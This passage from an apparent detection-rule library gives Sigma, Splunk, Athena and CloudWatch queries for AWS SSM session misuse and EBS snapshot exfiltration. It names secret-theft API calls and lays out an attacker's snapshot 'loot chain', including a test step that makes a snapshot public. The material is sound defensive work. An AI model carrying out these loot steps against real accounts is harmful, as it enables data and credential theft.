| table _time, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.target, sourceIPAddress, userAgent`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.target, sourceIPAddress, userAgent
FROM cloudtrail_logs
WHERE eventSource = 'ssm.amazonaws.com'
  AND eventName = 'StartSession'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.target, sourceIPAddress
| filter eventSource = "ssm.amazonaws.com"
| filter eventName = "StartSession"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ssm"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ssm.amazonaws.com"], eventName: ["StartSession"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ssm.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.target", "sourceIPAddress", "userAgent", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ssm.amazonaws.com", eventName: "StartSession", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { target: "i-0abc123def456" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and target instance.", "Verify if the session was authorized.", "Check sourceIPAddress and userAgent for anomalies."],
    testingSteps: ["Call aws ssm start-session --target i-xxx.", "Verify CloudTrail captures StartSession.", "Run the detection to confirm visibility."],
  },
  {
    id: "det-076",
    title: "StartSession by Unexpected Actor",
    description: "Detects sessions initiated by identities that normally should not open interactive shells to EC2. Suspicious actors include IAM users outside admin/helpdesk/platform roles, application roles, EC2 instance roles, and non-admin assumed roles.",
    awsService: "SSM",
    relatedServices: ["EC2"],
    severity: "High",
    tags: ["SSM", "Session Manager", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known SSM administrators", "Helpdesk or platform automation"],
    rules: {
      sigma: `title: StartSession by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ssm.amazonaws.com
    eventName: StartSession
  filter_arn:
    userIdentity.arn|contains:
      - '/role/Admin'
      - '/role/SSMAdmin'
      - '/role/Platform'
      - '/role/Helpdesk'
      - '/role/DevOps'
      - '/user/admin'
  filter_issuer:
    userIdentity.sessionContext.sessionIssuer.arn|contains:
      - '/role/Admin'
      - '/role/SSMAdmin'
      - '/role/Platform'
  condition: selection and not (filter_arn or filter_issuer)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ssm.amazonaws.com eventName=StartSession
| where NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/SSMAdmin%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Helpdesk%") OR like(userIdentity.arn, "%/role/DevOps%") OR like(userIdentity.arn, "%/user/admin%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Admin%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/SSMAdmin%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Platform%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, requestParameters.target, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, requestParameters.target, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ssm.amazonaws.com'
  AND eventName = 'StartSession'
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/role/SSMAdmin%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
  AND userIdentity.arn NOT LIKE '%/role/Helpdesk%'
  AND userIdentity.arn NOT LIKE '%/role/DevOps%'
  AND userIdentity.arn NOT LIKE '%/user/admin%'
  AND (userIdentity.sessionContext.sessionIssuer.arn IS NULL OR (userIdentity.sessionContext.sessionIssuer.arn NOT LIKE '%/role/Admin%' AND userIdentity.sessionContext.sessionIssuer.arn NOT LIKE '%/role/SSMAdmin%' AND userIdentity.sessionContext.sessionIssuer.arn NOT LIKE '%/role/Platform%'))
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, requestParameters.target, sourceIPAddress
| filter eventSource = "ssm.amazonaws.com"
| filter eventName = "StartSession"
| filter userIdentity.arn not like /\\/role\\/(Admin|SSMAdmin|Platform|Helpdesk|DevOps)/ and userIdentity.arn not like /\\/user\\/admin/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ssm"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ssm.amazonaws.com"], eventName: ["StartSession"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ssm.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.target", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ssm.amazonaws.com", eventName: "StartSession", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { target: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for SSM access.", "Update allowlist if legitimate."],
    testingSteps: ["As a non-admin role, call StartSession.", "Verify detection triggers.", "Add role to allowlist and confirm suppression."],
  },
  {
    id: "det-077",
    title: "StartSession to Sensitive or Unusual Target",
    description: "Detects sessions opened to production, privileged, break-glass, domain-controller-like, secrets-hosting, or otherwise sensitive instances. Target matching uses instance ID patterns or naming conventions.",
    awsService: "SSM",
    relatedServices: ["EC2"],
    severity: "High",
    tags: ["SSM", "Session Manager", "Sensitive Target"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Authorized access to production instances", "Break-glass procedures"],
    rules: {
      sigma: `title: StartSession to Sensitive or Unusual Target
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ssm.amazonaws.com
    eventName: StartSession
  filter_target:
    requestParameters.target|contains:
      - 'prod'
      - 'Prod'
      - 'production'
      - 'dc'
      - 'domain'
      - 'bastion'
      - 'secrets'
      - 'breakglass'
      - 'privileged'
  condition: selection and filter_target
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ssm.amazonaws.com eventName=StartSession
| where like(requestParameters.target, "%prod%") OR like(requestParameters.target, "%Prod%") OR like(requestParameters.target, "%production%") OR like(requestParameters.target, "%dc%") OR like(requestParameters.target, "%domain%") OR like(requestParameters.target, "%bastion%") OR like(requestParameters.target, "%secrets%") OR like(requestParameters.target, "%breakglass%") OR like(requestParameters.target, "%privileged%")
| table _time, userIdentity.arn, requestParameters.target, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, requestParameters.target, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ssm.amazonaws.com'
  AND eventName = 'StartSession'
  AND (requestParameters.target LIKE '%prod%' OR requestParameters.target LIKE '%Prod%' OR requestParameters.target LIKE '%production%' OR requestParameters.target LIKE '%dc%' OR requestParameters.target LIKE '%domain%' OR requestParameters.target LIKE '%bastion%' OR requestParameters.target LIKE '%secrets%' OR requestParameters.target LIKE '%breakglass%' OR requestParameters.target LIKE '%privileged%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.target, sourceIPAddress
| filter eventSource = "ssm.amazonaws.com"
| filter eventName = "StartSession"
| filter requestParameters.target like /prod|dc|domain|bastion|secrets|breakglass|privileged/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ssm"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ssm.amazonaws.com"], eventName: ["StartSession"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ssm.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.target", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ssm.amazonaws.com", eventName: "StartSession", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { target: "i-prod-db-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the target instance and its sensitivity.", "Verify if the session was authorized.", "Cross-reference with instance tags if available."],
    testingSteps: ["Start session to an instance with 'prod' in its identifier.", "Verify detection triggers."],
  },
  {
    id: "det-078",
    title: "StartSession Followed by Suspicious AWS API Activity",
    description: "High-confidence lateral movement: StartSession then within a short window, same actor performs GetSecretValue, KMS decrypt, AssumeRole, CreateAccessKey, S3 GetObject, IAM policy modification, or snapshot creation. CloudTrail does not expose shell commands; correlation with follow-on API activity raises confidence.",
    awsService: "SSM",
    relatedServices: ["EC2", "Secrets Manager", "KMS", "IAM", "S3"],
    severity: "Critical",
    tags: ["SSM", "Session Manager", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate admin session followed by expected API use"],
    rules: {
      sigma: `title: StartSession Followed by Sensitive API Activity
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_start:
    eventSource: ssm.amazonaws.com
    eventName: StartSession
  selection_sensitive:
    eventName:
      - GetSecretValue
      - Decrypt
      - AssumeRole
      - CreateAccessKey
      - PutUserPolicy
      - AttachRolePolicy
      - PutRolePolicy
      - CreateSnapshot
      - CreateSnapshots
  condition: 1 of selection_*
level: critical
# Full correlation (actor, 15 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=ssm.amazonaws.com AND eventName=StartSession) OR (eventName=GetSecretValue OR eventName=Decrypt OR eventName=AssumeRole OR eventName=CreateAccessKey OR eventName=PutUserPolicy OR eventName=AttachRolePolicy OR eventName=PutRolePolicy OR eventName=CreateSnapshot OR eventName=CreateSnapshots))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_start=if(eventSource="ssm.amazonaws.com" AND eventName="StartSession", 1, 0)
| eval is_sensitive=if(eventName IN ("GetSecretValue","Decrypt","AssumeRole","CreateAccessKey","PutUserPolicy","AttachRolePolicy","PutRolePolicy","CreateSnapshot","CreateSnapshots"), 1, 0)
| transaction actor maxspan=15m
| where mvcount(mvfilter(is_start=1))>0 AND mvcount(mvfilter(is_sensitive=1))>0
| table _time, actor, eventName, requestParameters.target`,
      cloudtrail: `WITH ssm_start AS (
  SELECT userIdentity.arn AS actor, eventTime AS start_time
  FROM cloudtrail_logs
  WHERE eventSource = 'ssm.amazonaws.com'
    AND eventName = 'StartSession'
),
sensitive_use AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('GetSecretValue', 'Decrypt', 'AssumeRole', 'CreateAccessKey', 'PutUserPolicy', 'AttachRolePolicy', 'PutRolePolicy', 'CreateSnapshot', 'CreateSnapshots')
)
SELECT e.actor, e.start_time, s.use_time, s.eventName
FROM ssm_start e
JOIN sensitive_use s ON e.actor = s.actor
  AND s.use_time > e.start_time
  AND s.use_time <= e.start_time + INTERVAL '15' MINUTE
ORDER BY e.start_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.target
| filter (eventSource = "ssm.amazonaws.com" and eventName = "StartSession")
  or eventName in ["GetSecretValue", "Decrypt", "AssumeRole", "CreateAccessKey", "PutUserPolicy", "AttachRolePolicy", "PutRolePolicy", "CreateSnapshot", "CreateSnapshots"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.ssm"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ssm.amazonaws.com"], eventName: ["StartSession"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ssm.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.target", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ssm.amazonaws.com", eventName: "StartSession", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { target: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and StartSession time.", "Review sequence: StartSession → sensitive API within 15 min.", "Verify if follow-on activity was from the session or separate automation."],
    testingSteps: ["Start SSM session, then perform GetSecretValue within 15 min.", "Run Splunk or Athena correlation query."],
  },

  // --- EC2 Volume Snapshot Loot ---
  {
    id: "det-079",
    title: "EBS Snapshot Created",
    description: "Baseline visibility whenever a snapshot is created from a volume. Snapshot creation can be legitimate backup/admin activity, so this is visibility, not immediate exfiltration detection.",
    awsService: "EC2",
    relatedServices: ["EBS"],
    severity: "Medium",
    tags: ["EC2", "EBS", "Snapshot", "Credential Access"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate backup", "DLM", "Infra pipelines"],
    rules: {
      sigma: `title: EBS Snapshot Created
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName:
      - CreateSnapshot
      - CreateSnapshots
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com (eventName=CreateSnapshot OR eventName=CreateSnapshots)
| table _time, userIdentity.arn, eventName, requestParameters.volumeId, requestParameters.description, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.volumeId, requestParameters.description, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName IN ('CreateSnapshot', 'CreateSnapshots')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.volumeId, requestParameters.description, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName in ["CreateSnapshot", "CreateSnapshots"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["CreateSnapshot", "CreateSnapshots"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.volumeId", "requestParameters.description", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "CreateSnapshot", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { volumeId: "vol-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and source volume.", "Verify if snapshot creation was authorized.", "Check for follow-on ModifySnapshotAttribute or CopySnapshot."],
    testingSteps: ["Call CreateSnapshot on a volume.", "Verify CloudTrail captures the event.", "Run the detection."],
  },
  {
    id: "det-080",
    title: "Snapshot Created by Unexpected Actor",
    description: "Detects snapshot creation by identities that normally should not snapshot production volumes. Suspicious actors include IAM users outside infra/admin roles, application roles, and unusual assumed roles. Excludes backup services, DLM, and expected platform roles.",
    awsService: "EC2",
    relatedServices: ["EBS"],
    severity: "High",
    tags: ["EC2", "EBS", "Snapshot", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["DLM", "Backup automation", "Approved infra pipelines"],
    rules: {
      sigma: `title: Snapshot Created by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName:
      - CreateSnapshot
      - CreateSnapshots
  filter_known:
    userIdentity.arn|contains:
      - '/role/Backup'
      - '/role/DLM'
      - '/role/Infra'
      - '/role/Admin'
      - '/role/Platform'
    userIdentity.principalId|contains:
      - 'dlm.amazonaws.com'
      - 'backup'
  condition: selection and not filter_known
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com (eventName=CreateSnapshot OR eventName=CreateSnapshots)
| where NOT (like(userIdentity.arn, "%/role/Backup%") OR like(userIdentity.arn, "%/role/DLM%") OR like(userIdentity.arn, "%/role/Infra%") OR like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.principalId, "%dlm.amazonaws.com%") OR like(userIdentity.principalId, "%backup%"))
| table _time, userIdentity.type, userIdentity.arn, eventName, requestParameters.volumeId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, eventName, requestParameters.volumeId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName IN ('CreateSnapshot', 'CreateSnapshots')
  AND userIdentity.arn NOT LIKE '%/role/Backup%'
  AND userIdentity.arn NOT LIKE '%/role/DLM%'
  AND userIdentity.arn NOT LIKE '%/role/Infra%'
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
  AND (userIdentity.principalId IS NULL OR (userIdentity.principalId NOT LIKE '%dlm.amazonaws.com%' AND userIdentity.principalId NOT LIKE '%backup%'))
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, eventName, requestParameters.volumeId, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName in ["CreateSnapshot", "CreateSnapshots"]
| filter userIdentity.arn not like /\\/role\\/(Backup|DLM|Infra|Admin|Platform)/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["CreateSnapshot", "CreateSnapshots"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.volumeId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "CreateSnapshot", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { volumeId: "vol-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and source volume.", "Verify if this identity is authorized for snapshot creation.", "Update allowlist if legitimate."],
    testingSteps: ["As a non-backup role, call CreateSnapshot.", "Verify detection triggers."],
  },
  {
    id: "det-081",
    title: "Snapshot Shared Externally or Made Public",
    description: "Detects the dangerous control point where a snapshot is exposed outside the account. ModifySnapshotAttribute with createVolumePermission add (external account IDs or Group=all) is one of the strongest exfiltration indicators in the snapshot loot chain.",
    awsService: "EC2",
    relatedServices: ["EBS"],
    severity: "Critical",
    tags: ["EC2", "EBS", "Snapshot", "Exfiltration"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate cross-account sharing for DR", "Approved migration"],
    rules: {
      sigma: `title: Snapshot Shared Externally or Made Public
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: ModifySnapshotAttribute
  filter_permission:
    requestParameters.createVolumePermission|contains:
      - 'add'
      - 'all'
    requestParameters.groupNames|contains: 'all'
  condition: selection and filter_permission
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=ModifySnapshotAttribute
| where (requestParameters.createVolumePermission.add.userIds IS NOT NULL AND mvcount(requestParameters.createVolumePermission.add.userIds)>0) OR (requestParameters.createVolumePermission.add.groups IS NOT NULL AND mvcount(requestParameters.createVolumePermission.add.groups)>0) OR like(requestParameters.groupNames, "%all%")
| table _time, userIdentity.arn, requestParameters.snapshotId, requestParameters.createVolumePermission, requestParameters.groupNames, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, requestParameters.snapshotId, requestParameters.createVolumePermission, requestParameters.groupNames, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'ModifySnapshotAttribute'
  AND (requestParameters.createVolumePermission.add.userIds IS NOT NULL
    OR requestParameters.createVolumePermission.add.groups IS NOT NULL
    OR requestParameters.groupNames LIKE '%all%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.snapshotId, requestParameters.createVolumePermission, requestParameters.groupNames, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "ModifySnapshotAttribute"
| filter ispresent(requestParameters.createVolumePermission.add) or requestParameters.groupNames like /all/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["ModifySnapshotAttribute"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.snapshotId", "requestParameters.createVolumePermission", "requestParameters.groupNames", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "ModifySnapshotAttribute", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { snapshotId: "snap-xxx", createVolumePermission: { add: { groups: ["all"] } } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the snapshot and actor.", "Check if sharing was authorized.", "Review recipient account IDs if present."],
    testingSteps: ["Call ModifySnapshotAttribute with createVolumePermission add group all.", "Verify detection triggers."],
  },
  {
    id: "det-082",
    title: "Snapshot Copied or Rehydrated After Creation",
    description: "Detects likely data loot chain behavior: CreateSnapshot followed shortly by CopySnapshot, CreateVolume from that snapshot, or AttachVolume of restored volume. Correlates snapshot creation with rehydration rather than benign backup.",
    awsService: "EC2",
    relatedServices: ["EBS"],
    severity: "High",
    tags: ["EC2", "EBS", "Snapshot", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate DR or migration workflows"],
    rules: {
      sigma: `title: Snapshot Copied or Rehydrated After Creation
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_create:
    eventSource: ec2.amazonaws.com
    eventName:
      - CreateSnapshot
      - CreateSnapshots
  selection_rehydrate:
    eventSource: ec2.amazonaws.com
    eventName:
      - CopySnapshot
      - CreateVolume
      - AttachVolume
  condition: 1 of selection_*
level: high
# Full correlation (snapshot ID, 2h) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com (eventName=CreateSnapshot OR eventName=CreateSnapshots OR eventName=CopySnapshot OR eventName=CreateVolume OR eventName=AttachVolume)
| eval snapshot_id=coalesce(requestParameters.volumeId, requestParameters.sourceSnapshotId, requestParameters.snapshotId)
| eval is_create=if(eventName IN ("CreateSnapshot","CreateSnapshots"), 1, 0)
| eval is_rehydrate=if(eventName IN ("CopySnapshot","CreateVolume","AttachVolume"), 1, 0)
| transaction userIdentity.arn maxspan=2h
| where mvcount(mvfilter(is_create=1))>0 AND mvcount(mvfilter(is_rehydrate=1))>0
| table _time, userIdentity.arn, eventName, snapshot_id`,
      cloudtrail: `WITH create_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS create_time,
    COALESCE(requestParameters.volumeId, '') AS vol_id
  FROM cloudtrail_logs
  WHERE eventSource = 'ec2.amazonaws.com'
    AND eventName IN ('CreateSnapshot', 'CreateSnapshots')
),
rehydrate_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS rehydrate_time, eventName,
    requestParameters.sourceSnapshotId AS snap_id
  FROM cloudtrail_logs
  WHERE eventSource = 'ec2.amazonaws.com'
    AND eventName IN ('CopySnapshot', 'CreateVolume', 'AttachVolume')
)
SELECT c.actor, c.create_time, r.rehydrate_time, r.eventName, r.snap_id
FROM create_evt c
JOIN rehydrate_evt r ON c.actor = r.actor
  AND r.rehydrate_time > c.create_time
  AND r.rehydrate_time <= c.create_time + INTERVAL '2' HOUR
ORDER BY c.create_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.volumeId, requestParameters.sourceSnapshotId, requestParameters.snapshotId
| filter eventSource = "ec2.amazonaws.com"
| filter eventName in ["CreateSnapshot", "CreateSnapshots", "CopySnapshot", "CreateVolume", "AttachVolume"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["CreateSnapshot", "CreateSnapshots", "CopySnapshot", "CreateVolume", "AttachVolume"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.volumeId", "requestParameters.sourceSnapshotId", "requestParameters.snapshotId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "CreateSnapshot", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { volumeId: "vol-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and snapshot chain.", "Review CreateSnapshot → CopySnapshot/CreateVolume/AttachVolume sequence.", "Verify if workflow was authorized."],
    testingSteps: ["Create snapshot, then CopySnapshot or CreateVolume within 2h.", "Run Splunk or Athena correlation query."],
  },
  {
    id: "det-083",
    title: "Snapshot Loot Chain",
    description: "High-confidence multi-step credential/data theft: CreateSnapshot → ModifySnapshotAttribute (share/public) or CopySnapshot → CreateVolume → AttachVolume. Models the actual looting workflow rather than any single API.",
    awsService: "EC2",
    relatedServices: ["EBS"],
    severity: "Critical",
    tags: ["EC2", "EBS", "Snapshot", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate DR or migration with approved sharing"],
    rules: {
      sigma: `title: Snapshot Loot Chain
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_create:
    eventSource: ec2.amazonaws.com
    eventName:
      - CreateSnapshot
      - CreateSnapshots
  selection_share:
    eventSource: ec2.amazonaws.com
    eventName: ModifySnapshotAttribute
  selection_copy:
    eventSource: ec2.amazonaws.com
    eventName: CopySnapshot
  selection_volume:
    eventSource: ec2.amazonaws.com
    eventName:
      - CreateVolume
      - AttachVolume
  condition: 1 of selection_*
level: critical
# Full chain correlation requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com (eventName=CreateSnapshot OR eventName=CreateSnapshots OR eventName=ModifySnapshotAttribute OR eventName=CopySnapshot OR eventName=CreateVolume OR eventName=AttachVolume)
| eval actor=userIdentity.arn
| eval is_create=if(eventName IN ("CreateSnapshot","CreateSnapshots"), 1, 0)
| eval is_share=if(eventName="ModifySnapshotAttribute", 1, 0)
| eval is_copy=if(eventName="CopySnapshot", 1, 0)
| eval is_volume=if(eventName IN ("CreateVolume","AttachVolume"), 1, 0)
| transaction actor maxspan=4h
| where mvcount(mvfilter(is_create=1))>0 AND (mvcount(mvfilter(is_share=1))>0 OR mvcount(mvfilter(is_copy=1))>0) AND mvcount(mvfilter(is_volume=1))>0
| table _time, actor, eventName, requestParameters.snapshotId, requestParameters.sourceSnapshotId`,
      cloudtrail: `WITH chain AS (
  SELECT userIdentity.arn AS actor, eventTime, eventName,
    requestParameters.snapshotId AS snap_id,
    requestParameters.sourceSnapshotId AS source_snap,
    requestParameters.createVolumePermission
  FROM cloudtrail_logs
  WHERE eventSource = 'ec2.amazonaws.com'
    AND eventName IN ('CreateSnapshot', 'CreateSnapshots', 'ModifySnapshotAttribute', 'CopySnapshot', 'CreateVolume', 'AttachVolume')
)
SELECT actor, eventTime, eventName, snap_id, source_snap
FROM chain
WHERE actor IN (
  SELECT actor FROM chain
  GROUP BY actor
  HAVING COUNT(DISTINCT eventName) >= 3
    AND MAX(CASE WHEN eventName IN ('CreateSnapshot','CreateSnapshots') THEN 1 ELSE 0 END) = 1
    AND MAX(CASE WHEN eventName IN ('ModifySnapshotAttribute','CopySnapshot') THEN 1 ELSE 0 END) = 1
    AND MAX(CASE WHEN eventName IN ('CreateVolume','AttachVolume') THEN 1 ELSE 0 END) = 1
)
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.snapshotId, requestParameters.sourceSnapshotId
| filter eventSource = "ec2.amazonaws.com"
| filter eventName in ["CreateSnapshot", "CreateSnapshots", "ModifySnapshotAttribute", "CopySnapshot", "CreateVolume", "AttachVolume"]
| stats count(*) as cnt, count_distinct(eventName) as distinct_events, collect_list(eventName) as events by userIdentity.arn
| filter cnt >= 3 and distinct_events >= 3
| sort cnt desc`,
